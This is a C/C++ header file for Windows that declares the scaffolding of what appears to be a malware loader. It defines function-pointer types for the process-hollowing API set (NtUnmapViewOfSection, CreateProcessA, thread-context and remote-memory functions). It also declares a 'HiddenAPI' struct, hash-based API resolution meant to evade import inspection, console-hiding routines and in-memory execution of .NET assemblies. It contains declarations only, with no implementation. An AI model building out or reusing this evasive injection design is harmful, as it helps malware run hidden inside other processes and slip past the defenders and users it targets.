#ifndef IMPORT_H
#define IMPORT_H

#include <Windows.h>
#include <winternl.h>

typedef LONG(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

// obf
typedef BOOL(WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI* pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL(WINAPI* pSetThreadContext)(HANDLE, const CONTEXT*);
typedef BOOL(WINAPI* pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD(WINAPI* pResumeThread)(HANDLE);

// hide api
struct HiddenAPI {
    pCreateProcessA CreateProcessA;
    pGetThreadContext GetThreadContext;
    pSetThreadContext SetThreadContext;
    pReadProcessMemory ReadProcessMemory;
    pWriteProcessMemory WriteProcessMemory;
    pVirtualAllocEx VirtualAllocEx;
    pVirtualAlloc VirtualAlloc;
    pResumeThread ResumeThread;
};

//  hyenya dly import.cppp
bool LoadHiddenAPI(HiddenAPI* api);
DWORD HashString(const char* str);
FARPROC GetAPIByHash(HMODULE hModule, DWORD hash);
HMODULE GetKernel32();
HWND GetConsoleWindowHidden();
BOOL ShowWindowHidden(HWND hWnd, int nCmdShow);
BOOL FreeConsoleHidden();
void HideConsole();
void ExecDotNetAssemblyFromMemory(LPVOID pFile, size_t fileSize, HiddenAPI* api);

#endif
